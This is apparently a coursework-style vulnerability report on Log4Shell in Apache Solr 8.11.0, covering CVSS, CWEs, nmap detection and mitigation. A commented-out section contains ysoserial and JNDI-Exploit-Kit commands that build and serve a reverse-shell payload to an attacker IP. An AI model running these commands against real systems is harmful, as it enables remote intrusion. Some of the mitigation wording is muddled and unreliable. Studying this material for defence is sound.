# Java Deserialisation

## CVE-2021-44228: Log4Shell Present in Apache Solr 8.11.0

### Vulnerability Overview

CVSS 3.1 Score: 10.0  (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H) [^NIST2026Log4Shell]

Linked CWEs: [^NIST2026Log4Shell][^CVEOrg2023Log4Shell]

- CWE-20: Improper Input Validation
- CWE-400: Uncontrolled Resource Consumption
- CWE-502: Deserialization of Untrusted Data
- CWE-917: Improper Neutralization of Special Elements used in an Expression Language Statement ('Expression Language Injection')

### Vulnerability Explanation: Underlying Security Theory, Relevant Weaknesses and Classification

<!-- #### Regarding Log4Shell Specifically -->

CVE-2021-44228, colloqiually known as Log4Shell, is a vulnerability that allows attackers to achieve remote code execution by exploiting insecure deserialisation in the Apache Log4j 2 library, a widely used logging library in Java applications. By default, Log4j will evaluate parameters in logs, enabling the lookup of remote servers.

One of the key features of Log4j is the ability to interpret strings to enrich log messages, wrapped within `${prefix:query}` and calling the `JNDILookup` class [^Hiesgen2024Log4Shell]. Whilst this could be used for legitimate purposes such as idenfying hostnames within logs, the `JNDILookup` class within  `Apache Log4j2 2.0-beta9` through `2.15.0` enables an attacker to link to a controlled LDAP server. Within some applications that use Log4j, such as `Solr 8.11.0`, there is no default validation against recieved serialised objects, which enables RCE from attacker-crafted objects pulled from server requests embedded within control log messages or log message parameters [^NIST2026Log4Shell].

Apache Solr is a search server that is designed for document retrieval and analytical applications on structured and unstructured datasets [^Deniz2023ApacheSolr][^Apache2021SolrOverview]. When clients request documents or authenticate to a server, Solr uses `Log4j 2.14.1` to document the request, which is vulnerable to the Log4Shell exploit [^Apache2021SolrLogging]. The following flow diagram illustrates the deserialisation vulnerability as it would occur within Apache Solr during runtime, as well as the intended (patched) flow of the program.

The Log4Shell vulnerability was estimated to be present within 10% of all digital assets, enabling attackers to conduct a wide array of activities such as data exfiltration, ransomware installation and denial of service [^IBM2023Log4Shell][^Hiesgen2024Log4Shell].

![Log4j interactions within Solr](SolrLog4JFlowDiagram.png)

---

### Demonstration of Exploitability

---

### Identifying the Vulnerability Using Techniques and Tools

The presence of `Apache Solr 8.11.0` on a machine can be confirmed through nmap port scanning `nmap -v -p` on the target machine, with the Admin UI being served on port 8983 by default [^Apache2021SolrAdminUI].

<!--
#### Ysoserial for Java

Ysoserial is a widely recognised exploitation tool specifically crafted to test the security of Java applications against serialisation vulnerabilities. It helps generate payloads that exploit these vulnerabilities, making it an essential tool for attackers and penetration testers who aim to assess and exploit applications that use Java serialisation.

To use Ysoserial, an attacker would typically generate a payload with a command such as `java -jar ysoserial.jar [payload type] '[command to execute]'`, where `[payload type]` is the type of exploit and `[command to execute]` is the arbitrary command they wish to run on the target system. For example, using the `CommonsCollections1` payload type might look like this: `java -jar ysoserial.jar CommonsCollections1 'calc.exe'`. This command generates a serialised object that will execute the specified command when deserialised by a vulnerable application. Ysoserial is available for download on GitHub.

RCE - JNDI-Injection-Exploit-Plus
https://github.com/cckuailong/JNDI-Injection-Exploit-Plus is another tool for generating workable JNDI links and provide background services by starting RMI server,LDAP server and HTTP server.\

RCE - ysoserial & JNDI-Exploit-Kit
This option is useful against applications on Java versions configured to trust only specified classes. ysoserial generates serialized graphs of trusted classes that can act as gadgets for arbitrary code execution; the target application must have the gadget class used by ysoserial on its classpath.

Using ysoserial or ysoserial-modified you can create the deserialization exploit that will be downloaded by JNDI:

# Rev shell via CommonsCollections5
java -jar ysoserial-modified.jar CommonsCollections5 bash 'bash -i >& /dev/tcp/10.10.14.10/7878 0>&1' > /tmp/cc5.ser
Use JNDI-Exploit-Kit to generate JNDI links where payloads wait for connections from vulnerable machines. The kit can serve its automatically generated exploits or custom deserialization payloads generated manually or with ysoserial.

java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -L 10.10.14.10:1389 -P /tmp/cc5.ser

-->

### How to Mitigate the Vulnerability

 Due to CVE-2021-44228 being discovered after `Solr 8.11.0` had been published, mitigation and remediation would take place during the Maintenance and Operations phase of the Software Development Lifecycle. For complete remediation against Log4Shell, the developers at Apache would need to update Log4j to version `2.17.1` or later, which limits `JNDILookup` class to localhosts, but is still vulnerable to denial of service attacks and buffer overflows due to a lack of recursion [^Doll2025Log4Shell][^IBM2023Log4Shell].

 Where patching isn't an option, alternative fixes are available that also fit within the scope of Maintenance and Operations, though these come with their own drawbacks. Messaging lookups can be disabled using the changing the `Log4j2.formatMsgNoLookups` system property to `True`, which prevents attackers from using lookup substitutions to conduct activities. However, this does not prevent other JNDI lookup vulnerabilities, such as CVE-2021-45046 in non-default configurations, still leaving residual risk [^Doll2025Log4Shell]. Another fix is to remove the `JNDILookup` class entirely, which is more secure than disabling lookups, but can cause a loss of function in apps that rely on the class as part of their core functionality.

 For future app development, developers should be aware of Log4Shell and factor in both the use of the exploit for RCE and vulnerable versions when threat modelling during the Requirements Definition phase of the software development lifecycle.

### Retesting For Resilience

## References

[^NIST2026Log4Shell]: <https://nvd.nist.gov/vuln/detail/cve-2021-44228>
[^CVEOrg2023Log4Shell]: <https://www.cve.org/CVERecord?id=CVE-2021-44228>
[^Deniz2023ApacheSolr]: <https://dergipark.org.tr/en/doi/10.17714/gumusfenbil.1213317>
[^IBM2023Log4Shell]: <https://www.ibm.com/think/topics/log4shell>
[^Hiesgen2024Log4Shell]: <https://ieeexplore.ieee.org/document/10628102>
[^Apache2021SolrAdminUI]: <https://solr.apache.org/guide/8_11/overview-of-the-solr-admin-ui.html>
[^Apache2021SolrOverview]: <https://solr.apache.org/guide/8_11/a-quick-overview.html>
[^Apache2021SolrLogging]: <https://solr.apache.org/guide/8_11/configuring-logging.html>
[^Doll2025Log4Shell]: <http://arxiv.org/abs/2501.17760>
